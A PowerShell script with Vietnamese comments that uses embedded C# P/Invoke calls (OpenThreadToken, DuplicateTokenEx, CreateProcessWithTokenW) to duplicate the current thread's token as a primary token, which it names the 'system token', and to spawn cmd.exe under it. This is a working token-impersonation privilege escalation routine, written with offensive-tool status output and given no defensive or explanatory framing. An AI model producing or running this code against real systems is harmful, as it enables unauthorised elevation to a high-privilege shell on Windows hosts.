# --- Nhúng mã C# để sử dụng DuplicateTokenEx ---
$duplicateTokenSource = @"
using System;
using System.Runtime.InteropServices;
public class TokenUtil {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int ImpersonationLevel,
        int TokenType,
        out IntPtr phNewToken);
}
"@
Add-Type -TypeDefinition $duplicateTokenSource

# --- Nhúng mã C# để sử dụng CreateProcessWithTokenW ---
$createProcessSource = @"
using System;
using System.Runtime.InteropServices;
public class ProcessUtil {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        uint dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);
}
"@
Add-Type -TypeDefinition $createProcessSource

# --- Nhúng mã C# để dùng OpenThreadToken ---
$openTokenSource = @"
using System;
using System.Runtime.InteropServices;
public class TokenOpener {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenThreadToken(
        IntPtr ThreadHandle,
        uint DesiredAccess,
        bool OpenAsSelf,
        out IntPtr TokenHandle);
}
"@
Add-Type -TypeDefinition $openTokenSource

# --- Bước 1: Lấy token của thread hiện tại ---
$TOKEN_ALL_ACCESS = 0xF01FF
$SecurityImpersonation = 2   # SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation
$TokenPrimary = 1           # TokenPrimary

$hCurrentThread = [TokenOpener]::GetCurrentThread()
$hToken = [IntPtr]::Zero
if (-not [TokenOpener]::OpenThreadToken($hCurrentThread, $TOKEN_ALL_ACCESS, $false, [ref] $hToken)) {
    Write-Error "OpenThreadToken failed. Error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    exit
}
Write-Output "[*] Opened thread token: $hToken"

# --- Bước 2: Dùng DuplicateTokenEx để nhân bản token ---
$hDupToken = [IntPtr]::Zero
if ([TokenUtil]::DuplicateTokenEx($hToken, $TOKEN_ALL_ACCESS, [IntPtr]::Zero, $SecurityImpersonation, $TokenPrimary, [ref] $hDupToken)) {
    Write-Output "[*] DuplicateTokenEx succeeded. Duplicated token: $hDupToken"
    $systemToken = $hDupToken
} else {
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Error "DuplicateTokenEx failed with error: $err"
    exit
}

# --- Bước 3: Sử dụng CreateProcessWithTokenW để tạo process mới (cmd.exe) ---
$si = New-Object ProcessUtil+STARTUPINFO
$si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object ProcessUtil+PROCESS_INFORMATION

$cmdPath = "C:\Windows\System32\cmd.exe"
Write-Output "[*] Creating process with token. Command: $cmdPath"
$result = [ProcessUtil]::CreateProcessWithTokenW($systemToken, 0, $null, $cmdPath, 0, [IntPtr]::Zero, $null, [ref] $si, [ref] $pi)
if ($result) {
    Write-Output "[+] Process created successfully. PID: $($pi.dwProcessId)"
} else {
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Error "CreateProcessWithTokenW failed with error: $err"
}
